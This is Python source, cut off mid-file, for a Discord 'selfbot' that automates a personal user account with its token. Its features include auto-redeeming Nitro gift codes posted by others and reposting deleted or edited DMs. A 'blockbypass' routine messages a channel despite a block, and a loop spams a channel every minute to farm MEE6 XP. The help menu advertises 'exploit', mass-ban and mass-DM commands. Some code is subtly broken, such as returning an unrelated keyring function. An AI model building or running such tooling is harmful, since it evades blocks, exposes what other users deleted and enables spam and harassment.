"""MIT License

Copyright (c) 2022 a5traa

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""

#Importing modules
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
import ctypes
import aiohttp
import colorama
import discord
from keyring import delete_password
import numpy
import requests
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4
from PIL import Image
from colorama import Fore; colorama.init()
from discord.ext import commands
from discord.utils import get
from gtts import gTTS

#Variable initialization
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

#SlefBot version
class SELFBOT():
    __version__ = "1.0.0"

#Recovery of the configuration put in the config.json file
with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
nitro_sniper = config.get('nitro_sniper')
stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

#SelfBot title
def atio_title():
    print(f"""\n\n{Fore.RESET}                            ██████╗ ████████╗██╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
                           ██╔═══██╗╚══██╔══╝██║██╔═══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
                           ██║██╗██║   ██║   ██║██║   ██║       ██║   ██║   ██║██║   ██║██║     
                           ██║██║██║   ██║   ██║██║   ██║       ██║   ██║   ██║██║   ██║██║     
                           ╚█║████╔╝   ██║   ██║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
                            ╚╝╚═══╝    ╚═╝   ╚═╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝\n""".replace('█', f'{b}█{y}'))
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}raadev {b}|{w} https://dsc.gg/astraadev {b}|{w} https://github.com/AstraaDev {b}|{w} https://ngu.bet/ {b}|{w} https://dsc.gg/ngubet {b}|{w} https://di\n{y}------------------------------------------------------------------------------------------------------------------------\n""")

#SelfBot home page
def startprint():
    if nitro_sniper:
        nitro_texte = f"{Fore.GREEN}Active"
    else:
        nitro_texte = f"{Fore.RED}Disabled"
    ctypes.windll.kernel32.SetConsoleTitleW(f"SelfBot v{SELFBOT.__version__} - Made By Astraa")
    atio_title()
    print(f"""                                            {y}[{b}+{y}]{w} SelfBot Informations:\n
                                                {y}[{w}#{y}]{w} Version:         v{SELFBOT.__version__}
                                                {y}[{w}#{y}]{w} Logged in as:    {Astraa.user.name}#{Astraa.user.discriminator}
                                                {y}[{w}#{y}]{w} User ID:         {Astraa.user.id}\n\n
                                            {y}[{b}+{y}]{w} Settings View:\n
                                                {y}[{w}#{y}]{w} Nitro Sniper:    {nitro_texte}
                                                {y}[{w}#{y}]{w} SelfBot Prefix:  {Astraa.command_prefix}\n
                                                {y}[{w}#{y}]{w} Cached Users:    {len(Astraa.users)}
                                                {y}[{w}#{y}]{w} Guilds Scraped:  {len(Astraa.guilds)}\n""")
    print(f"{y}[{Fore.GREEN}!{y}]{w} SelftBot Online!")

#Launching the SelfBot
def Init():
    token = config.get('token')
    prefix = config.get('prefix')
    if token == "":
        atio_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
        return
    elif prefix == "":
        atio_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
        return
    try:
        r = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
        r = str(r)
        if "400" in r:
            os.system("cls")
            atio_title()
            input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
            return
        elif "200" in r:
            Astraa.run(token, bot=False, reconnect=True)
    except Exception:
        os.system("cls")
        atio_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
        return

#Display of connection information
class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print(f"""\n{y}[{b}+{y}]{w} Connected to: {self.user.name}#{Astraa.user.discriminator}")
{y}[{b}+{y}]{w} Token: {self.http.token}
{y}[{b}+{y}]{w} Guilds Scraped: {guilds}
{y}[{b}+{y}]{w} Users: {users}
-------------------------------""")
        await self.logout()

#Initialization of the Bot parameters
Astraa = discord.Client()
Astraa = commands.Bot(description='ATIO Tool - SelfBot created by Astraa', command_prefix=prefix, self_bot=True)

Astraa.antiraid = False
Astraa.msgsniper = True
Astraa.slotbot_sniper = True
Astraa.giveaway_sniper = True
Astraa.mee6 = False
Astraa.mee6_channel = None
Astraa.sniped_message_dict = {}
Astraa.sniped_edited_message_dict = {}
Astraa.whitelisted_users = {}
Astraa.copycat = None
Astraa.blockbypass = None
Astraa.remove_command('help')



#Set async_executor fonction
def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

#Executor for the tts commands
@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f




#Event initialization
@Astraa.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command...', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('[ERROR]: Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        ctx.send(f'[ERROR]: {error_str}', delete_after=3)

@Astraa.event
async def on_message_edit(before, after):
    await Astraa.process_commands(after)

@Astraa.event
async def on_message(message):
    if Astraa.copycat is not None and Astraa.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)
    
    if Astraa.blockbypass is not None and message.author.id == Astraa.user.id:
        token = config.get('token')
        headers = {'Authorization': token}
        r = requests.post(f'https://discordapp.com/api/v6/channels/{Astraa.blockbypass}/messages', headers=headers, json={'content': message.content})
        Astraa.blockbypass = None
        await message.edit(content=f"Message sent with success!")
        return delete_password

    def GiveawayData():
        print(f"{y}[{b}+{y}]{w} SERVER: {message.guild}\n{y}[{b}+{y}]{w} CHANNEL: {message.channel}")

    def SlotBotData():
        print(f"{y}[{b}+{y}]{w} SERVER: {message.guild}\n{y}[{b}+{y}]{w} CHANNEL: {message.channel}")

    def NitroData(elapsed, code):
        print(f"{y}[{b}+{y}]{w} SERVER: {message.guild}\n{y}[{b}+{y}]{w} CHANNEL: {message.channel}\n{y}[{b}+{y}]{w} AUTHOR: {message.author}\n{y}[{b}+{y}]{w} ELAPSED: {elapsed}\n{y}[{b}+{y}]{w} CODE: {code}")

    time = datetime.datetime.now().strftime("%H:%M %p")

    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            token = config.get('token')
            headers = {'Authorization': token}
            r = requests.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', headers=headers).text

            if 'This gift has been redeemed already.' in r:
                print(f"\n{y}[{Fore.RED}{time}{y} - {w}Nitro Already Redeemed{y}]")
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Nitro Success{y}]")
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(f"\n{y}[{Fore.RED}{time}{y} - {w}Nitro Unknown Gift Code{y}]")
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if Astraa.slotbot_sniper:
            if message.author.id == 983332270884663297:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(f"\n{y}[{Fore.RED}{time}{y} - {w}SlotBot Couldnt Grab{y}]")
                    SlotBotData()
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Slotbot Grabbed{y}]")
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Astraa.giveaway_sniper:
            if message.author.id == 983332270884663297:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(f"\n{y}[{Fore.RED}{time}{y} - {w}Giveaway Couldnt React{y}]")
                    GiveawayData()
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Giveaway Sniped{y}]")
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Astraa.user.id}>' in message.content:
        if Astraa.giveaway_sniper:
            if message.author.id == 983332270884663297:
                print(f"\n{y}[{Fore.GREEN}{time}{y} - {w}Giveaway Won{y}]")
                GiveawayData()
        else:
            return
    await Astraa.process_commands(message)

@Astraa.event
async def on_connect():
    os.system('cls')  
    startprint()

@Astraa.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Astraa.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Astraa.whitelisted_users.keys() and i.user.id in Astraa.whitelisted_users[guild.id].keys() and i.user.id is not Astraa.user.id:
                    print(f"{y}[{Fore.RED}!{y}]{w} Not banned: {i.user.name}")
                else:
                    print(f"{y}[{Fore.GREEN}!{y}]{w} Banned: {i.user.name}")
                    await guild.ban(i.user, reason="SelfBot - Anti-Nuke")
        except Exception as e:
            print(e)

@Astraa.event
async def on_member_join(member):
    if Astraa.antiraid is True and member.bot:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Astraa.whitelisted_users.keys() and i.user.id in Astraa.whitelisted_users[member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="SelfBot - Anti-Nuke")
                    await guild.ban(i.user, reason="SelfBot - Anti-Nuke")
        except Exception as e:
            print(f"{y}[{Fore.RED}!{y}]{w} Error: {e}")

@Astraa.event
async def on_member_remove(member):
    if Astraa.antiraid is True:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                if guild.id in Astraa.whitelisted_users.keys() and i.user.id in Astraa.whitelisted_users[guild.id].keys() and i.user.id is not Astraa.user.id:
                    print(f"{y}[{Fore.RED}!{y}]{w} Not banned")
                else:
                    print(f"{y}[{Fore.GREEN}!{y}]{w} Banned")
                    await guild.ban(i.user, reason="SelfBot - Anti-Nuke")
        except Exception as e:
            print(f"{y}[{Fore.RED}!{y}]{w} Error: {e}")

@Astraa.event
async def on_message_delete(message):
    if message.author.id == Astraa.user.id:
        return
    if Astraa.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Astraa.sniped_message_dict) > 1000:
        Astraa.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
            message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Astraa.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
            message.content) + "\n\n**Attachments:**\n" + links
        Astraa.sniped_message_dict.update({channel_id: message_content})

@Astraa.event
async def on_message_edit(before, after):
    if before.author.id == Astraa.user.id:
        return
    if Astraa.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Astraa.sniped_edited_message_dict) > 1000:
        Astraa.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Astraa.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Astraa.sniped_edited_message_dict.update({channel_id: message_content})




#SelfBot commands
#MessageSniper/AntiRaid/Mee6/SlotBot/Giveway commands
#Enable or disable the messages sniper option
@Astraa.command()
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Astraa.msgsniper = True
        await ctx.send('Sniper is now **enabled**!')
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Astraa.msgsniper = False
        await ctx.send('Sniper is now **disabled**!')
    else:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}msgsniper [true/false]')

#Enable or disable the anti raid option
@Astraa.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    Astraa.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
        Astraa.antiraid = True
        await ctx.send('Anti-Nuke is now **enabled**!')
    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
        Astraa.antiraid = False
        await ctx.send('Anti-Nuke is now **disabled**!')
    else:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}antiraid [true/false]')

#Enable or disable the mee6 option
@Astraa.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    await ctx.message.delete()
    if param is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}mee6 [true/false]')
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
            await ctx.send("[ERROR]: You can't bind Auto-MEE6 to a DM or GroupChannel", delete_after=3)
            return
        else:
            Astraa.mee6 = True
            await ctx.send("Auto-MEE6 Successfully **enabled** to `" + ctx.channel.name + "`", delete_after=3)
            Astraa.mee6_channel = ctx.channel.id
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Astraa.mee6 = False
        await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
    while Astraa.mee6 is True:
        sentences = ['Stop waiting for exceptional things to just happen.',
                     'The lyrics of the song sounded like fingernails on a chalkboard.',
                     'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
                     'He had a hidden stash underneath the floorboards in the back room of the house.',
                     'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
                     'People generally approve of dogs eating cat food but not cats eating dog food.',
                     'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
                     'She was the type of girl who wanted to live in a pink house.',
                     'The bees decided to have a mutiny against their queen.',
                     'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
                     'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
                     'They desperately needed another drummer since the current one only knew how to play bongos.',
                     'He waited for the stop sign to turn to a go sign.',
                     'His thought process was on so many levels that he gave himself a phobia of heights.',
                     'Her hair was windswept as she rode in the black convertible.',
                     'Karen realized the only way she was getting into heaven was to cheat.',
                     'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
                     'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
                     'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
                     'You probably shouldn\'t look at your feet.',
                     'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
                     'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
                     'The three-year-old girl ran down the beach as the kite flew behind her.',
                     'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
                     'They improved dramatically once the lead singer left.',
                     'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
                     'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
                     'People keep telling me "orange" but I still prefer "pink".',
                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                     'I liked their first two albums but changed my mind after that charity gig.',
                     'Plans for this weekend include turning wine into water.',
                     'A kangaroo is really just a rabbit on steroids.',
                     'He played the game as if his life depended on it and the truth was that it did.',
                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
                     'She let the balloon float up into the air with her hopes and dreams.',
                     'There was coal in his stocking and he was thrilled.',
                     'This made him feel like an old-style rootbeer float smells.',
                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                     'The light in his life was actually a fire burning all around him.',
                     'Truth in advertising and dinosaurs with skateboards have much in common.',
                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                     'The view from the lighthouse excited even the most seasoned traveler.',
                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                     'It\'s difficult to understand the lengths he\'d go to remain short.',
                     'Nobody questions who built the pyramids in Mexico.',
                     'They ran around the corner to find that they had traveled back in time.']
        await Astraa.get_channel(Astraa.mee6_channel).send(random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)

#Enable or disable the slotbot option
@Astraa.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Astraa.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Astraa.slotbot_sniper = True
        await ctx.send("SlotBot Successfully **enabled**", delete_after=3)
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Astraa.slotbot_sniper = False
        await ctx.send("SlotBot Successfully **disabled**", delete_after=3)
    else:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}slotbot [true/false]')

#Enable or disable the giveway option
@Astraa.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Astraa.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Astraa.giveaway_sniper = True
        await ctx.send("Giveway Sniper Successfully **enabled**", delete_after=3)
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Astraa.giveaway_sniper = False
        await ctx.send("Giveway Sniper Successfully **disabled**", delete_after=3)
    else:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}giveaway [true/false]')


#WhiteList commands
#Add a user to the whitelist
@Astraa.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}whitelist <user>')
    else:
        if ctx.guild.id not in Astraa.whitelisted_users.keys():
            Astraa.whitelisted_users[ctx.guild.id] = {}
        if user.id in Astraa.whitelisted_users[ctx.guild.id]:
            await ctx.send("**" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "** already whitelisted")
        else:
            Astraa.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")

#See the whitelist
@Astraa.command(aliases=['wld'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All whitelisted users:`\n'
        for key in Astraa.whitelisted_users:
            for key2 in Astraa.whitelisted_users[key]:
                user = Astraa.get_user(key2)
                whitelist += '**+** ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',"\_") + "**#**" + user.discriminator + " in " + Astraa.get_guild(key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "\n"
        await ctx.send(whitelist)
    else:
        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',"\_") + '\'s Whitelisted Users:`\n'
        for key in Astraa.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Astraa.whitelisted_users[ctx.guild.id]:
                    user = Astraa.get_user(key2)
                    whitelist += '**+** ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',"\_") + "**#**" + user.discriminator + " *(" + str(user.id) + ")*\n"
        await ctx.send(whitelist)

#Remove a user from the whitelist
@Astraa.command(aliases=['uwl'])
async def unwhitelist(ctx, user: discord.Member=None):
    if user is None:
        await ctx.send("[ERROR]: Please specify the user you would like to unwhitelist")
    else:
        if ctx.guild.id not in Astraa.whitelisted_users.keys():
            await ctx.send("**" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "** is not whitelisted")
            return
        if user.id in Astraa.whitelisted_users[ctx.guild.id]:
            Astraa.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Astraa.get_user(user.id)
            await ctx.send('Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',"\_") + '#' + user2.discriminator + '**')

#Clear the whitelist
@Astraa.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    Astraa.whitelisted_users.clear()
    await ctx.send('Successfully cleared the whitelist hash')


#Message Snipe commands
#Add a message to the message sniper
@Astraa.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Astraa.sniped_message_dict:
        await ctx.send(Astraa.sniped_message_dict[currentChannel])
    else:
        await ctx.send("[ERROR]: No message to snipe!")

#Edit the message sniper
@Astraa.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Astraa.sniped_edited_message_dict:
        await ctx.send(Astraa.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("[ERROR]: No message to snipe!")


#Shows servers in which you are admin
@Astraa.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Astraa.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"__Servers with Admin perms__: **{len(admins)}**\n__List__: {', '.join(admins)}"
    botPermServers = f"\n\n__Servers with BOT_ADD Permission__: **{len(bots)}**\n__List__: {', '.join(bots)}"
    banPermServers = f"\n\n__Servers with Ban Permission__: **{len(bans)}**\n__List__: {', '.join(bans)}"
    kickPermServers = f"\n\n__Servers with Kick Permission__: **{len(kicks)}**\n__List__: {', '.join(kicks)}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


#Shows all bots in the current server
@Astraa.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
    await ctx.send(f"__Bots in this server__: **{len(bots)}**\n__List__: {', '.join(bots)}")


#Shows all available commands
@Astraa.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = f"""**Astraa SelfBot | Prefix: `{Astraa.command_prefix}`**\n
> :pushpin: `GENERAL`\n*Shows all general commands* (like prefix, shutdown, ...)
> :notepad_spiral: `USEFUL`\n*Shows all useful commands* (like tts, hastebin, nitro, ...)
> :tools: `ATIO`\n*Shows all ATIO Tool commands* (like tokeninfo, serverinfo, ...)
> :space_invader: `EXPLOIT`\n*Shows all exploit commands* (like hide, edit, bypassblock, ...)
> :woozy_face: `FUN`\n*Shows all fun commands* (like magik, hack, minesweeper, ...)
> :pager: `SERVER`\n*Shows all server commands* (like copy, massban, massdm, ...)
> :paperclip: `FRIEND`\n*Shows all friend commands* (like acceptfriends, delfriends, ...)
> :restroom: `GROUP`\n*Shows all group commands* (like kickgc, leavegroup, ...)
> :barber: `MEME`\n*Shows all meme commands* (like dog, sadcat, kiss, ...)
> :incoming_envelope: `MESSAGE`\n*Shows all message commands* (like lenny, bold, empty, ...)"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "general":
        embed = f"""**GENERAL COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :handshake: `{Astraa.command_prefix}help <category>`\n*Returns all commands of that category*
> :wrench: `{Astraa.command_prefix}prefix <prefix>`\n*Changes the bot's prefix*
> :slot_machine: `{Astraa.command_prefix}slotbot <true/false>`\n*Enable or disable the slotbot option*
> :tada: `{Astraa.command_prefix}giveaway <true/false>`\n*Enable or disable the giveway option*
> :gun: `{Astraa.command_prefix}msgsniper <true/false>`\n*Enable or disable the msgsniper option*
> :anger: `{Astraa.command_prefix}antinuke <true/false>`\n*Enable or disable the antinuke option*
> :smile: `{Astraa.command_prefix}mee6 <true/false>`\n*Enable or disable the mee6 option*
> :page_facing_up: `{Astraa.command_prefix}whitelist <user>`\n*Add a user to the whitelist*
> :no_entry_sign: `{Astraa.command_prefix}unwhitelist <user>`\n*Remove a user from the whitelist*
> :broom: `{Astraa.command_prefix}clearwhitelist`\n*Clear the whitelist*
> :crown: `{Astraa.command_prefix}adminservers`\n*Shows servers in which you are admin*
> :robot: `{Astraa.command_prefix}bots`\n*Shows all bots in the current server*
> :electric_plug: `{Astraa.command_prefix}ping`\n*Returns the bot's latency*
> :hourglass: `{Astraa.command_prefix}uptime`\n*Return how long the selfbot has been running*
> :no_entry: `{Astraa.command_prefix}shutdown`\n*Shutsdown the selfbot*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "useful":
        embed_1 = f"""**USEFUL COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :cold_face: `{Astraa.command_prefix}astraa`\n*Show my social networks*
